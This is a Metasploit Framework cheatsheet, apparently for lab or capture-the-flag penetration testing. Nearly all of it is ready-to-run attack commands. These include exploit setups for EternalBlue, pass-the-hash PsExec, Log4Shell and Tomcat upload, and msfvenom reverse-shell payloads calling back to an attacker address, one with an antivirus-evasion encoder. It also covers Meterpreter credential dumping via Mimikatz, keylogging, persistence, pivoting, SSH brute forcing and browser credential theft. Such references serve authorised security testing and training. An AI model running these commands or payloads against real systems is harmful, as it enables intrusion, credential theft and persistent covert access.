# Metasploit Framework Cheatsheet

## Starting and Database

```bash
# Start PostgreSQL and initialize database
sudo systemctl start postgresql
sudo msfdb init

# Launch msfconsole
msfconsole
msfconsole -q                    # Quiet mode (no banner)

# Database commands
db_status                        # Check DB connection
workspace                        # List workspaces
workspace -a pentest1            # Create workspace
workspace pentest1               # Switch workspace
workspace -d pentest1            # Delete workspace
```

---

## Core Commands

```bash
# Search for modules
search eternalblue
search type:exploit platform:windows smb
search type:auxiliary scanner ssh
search cve:2021-44228
search name:webdelivery

# Use a module
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/smb/smb_version

# Module info and options
info
show options
show advanced
show targets
show payloads

# Set options
set RHOSTS 10.10.10.5
set RPORT 445
set LHOST 10.10.14.5
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
setg LHOST 10.10.14.5           # Set global (persists across modules)

# Execute
exploit                          # or: run
exploit -j                       # Run as background job
exploit -z                       # Don't interact with session after success

# Jobs and sessions
jobs                             # List background jobs
kill 0                           # Kill job 0
sessions                         # List active sessions
sessions -i 1                    # Interact with session 1
sessions -k 1                    # Kill session 1
sessions -K                      # Kill all sessions
sessions -u 1                    # Upgrade shell to meterpreter
```

---

## Common Exploits

```bash
# MS17-010 EternalBlue (SMB)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
exploit

# PsExec (pass-the-hash)
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.5
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
exploit

# Web Delivery (fileless payload)
use exploit/multi/script/web_delivery
set TARGET 2                     # 0=Python, 2=PSH, 5=Linux
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
exploit
# Copy the generated one-liner and run on target

# HTA Server
use exploit/windows/misc/hta_server
set SRVHOST 10.10.14.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
exploit
# Deliver the URL to the target

# Tomcat Manager Upload
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.10.5
set HttpUsername tomcat
set HttpPassword s3cret
set PAYLOAD java/meterpreter/reverse_tcp
exploit

# PHP Reverse Shell (manual upload)
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
exploit

# Log4Shell
use exploit/multi/http/log4shell_header_injection
set RHOSTS 10.10.10.5
set RPORT 8080
set HttpHeader X-Api-Version
set PAYLOAD java/meterpreter/reverse_tcp
exploit
```

---

## Meterpreter Commands

```bash
# System information
sysinfo                          # OS, hostname, arch
getuid                           # Current user
getpid                           # Current process ID
ps                               # List processes
idletime                         # User idle time

# Privilege escalation
getsystem                        # Attempt SYSTEM via named pipe
getprivs                         # List current privileges

# Process migration (move to stable process)
ps                               # Find target PID
migrate 1234                     # Migrate to PID 1234
migrate -N explorer.exe          # Migrate by name

# File system
pwd                              # Current directory
ls                               # List files
cd C:\\Users                     # Change directory
cat C:\\Users\\admin\\flag.txt   # Read file
download C:\\Users\\admin\\secret.txt /tmp/secret.txt
upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe
edit C:\\inetpub\\wwwroot\\web.config
search -f *.txt -d C:\\Users     # Search for files
search -f password* -d C:\\      # Search for password files

# Credential harvesting
hashdump                         # Dump SAM hashes
load kiwi                        # Load Mimikatz extension
creds_all                        # Dump all credentials
creds_msv                        # Dump MSV credentials (NTLM)
creds_kerberos                   # Dump Kerberos tickets
creds_wdigest                    # Dump WDigest plaintext
lsa_dump_sam                     # Dump SAM via LSA
lsa_dump_secrets                 # Dump LSA secrets
kerberos_ticket_list             # List Kerberos tickets

# Networking
ipconfig                         # Network interfaces
route                            # Routing table
arp                              # ARP table
netstat                          # Active connections

# Port forwarding
portfwd add -l 8080 -p 80 -r 10.10.10.100    # Local port forward
portfwd add -l 3389 -p 3389 -r 10.10.10.100  # Forward RDP
portfwd list                                   # List port forwards
portfwd delete -l 8080                         # Remove forward

# Pivoting (route through session)
# In msfconsole (not meterpreter):
route add 10.10.10.0/24 1        # Route subnet through session 1
# Or use autoroute:
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# SOCKS proxy for pivoting
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
# Configure proxychains: socks5 127.0.0.1 1080

# Shell and channels
shell                            # Drop to OS shell
execute -f cmd.exe -i -H         # Execute hidden process
channel -l                       # List channels
channel -i 1                     # Interact with channel

# Screenshots and keylogging
screenshot                       # Capture screenshot
keyscan_start                    # Start keylogger
keyscan_dump                     # Dump captured keystrokes
keyscan_stop                     # Stop keylogger

# Persistence
run persistence -U -i 10 -p 4444 -r 10.10.14.5  # Deprecated but works
# Better: use exploit/windows/local/persistence_service

# Background session
background                       # Return to msfconsole (Ctrl-Z)
```

---

## Auxiliary Modules

```bash
# SMB version scanner
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.0/24
run

# SMB share enumeration
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.10.5
run

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.5
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run

# HTTP directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.10.10.5
set RPORT 80
run

# FTP anonymous login check
use auxiliary/scanner/ftp/anonymous
set RHOSTS 10.10.10.0/24
run

# SNMP community string scanner
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 10.10.10.0/24
run

# Port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.5
set PORTS 1-1024
set THREADS 10
run
```

---

## msfvenom Payloads

```bash
# Windows reverse TCP (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Windows reverse TCP (stageless — works better through unstable connections)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Linux meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py

# Java WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# ASPX
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx

# JavaScript
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f js_le -e generic/none

# MSI installer
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o setup.msi

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll

# Shellcode (C format)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c

# Encoder to evade basic AV
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f exe -o encoded_shell.exe

# List formats and encoders
msfvenom --list formats
msfvenom --list encoders
msfvenom --list payloads | grep reverse_tcp
```

---

## Multi/Handler (Listener)

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false          # Keep listening after session
exploit -j                       # Run as background job

# Handler for staged payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
# Handler for stageless payload
set PAYLOAD windows/x64/meterpreter_reverse_tcp
# Handler for raw shell
set PAYLOAD generic/shell_reverse_tcp
```

---

## Post-Exploitation Modules

```bash
# Local exploit suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Enumerate logged-in users
use post/windows/gather/enum_logged_on_users
set SESSION 1
run

# Gather installed applications
use post/windows/gather/enum_applications
set SESSION 1
run

# Check VM
use post/windows/gather/checkvm
set SESSION 1
run

# Dump Chrome credentials
use post/multi/gather/chrome_cookies
set SESSION 1
run

# Dump Firefox credentials
use post/multi/gather/firefox_creds
set SESSION 1
run

# Enable RDP
use post/windows/manage/enable_rdp
set SESSION 1
run

# Persistence via registry
use exploit/windows/local/persistence_service
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
exploit
```
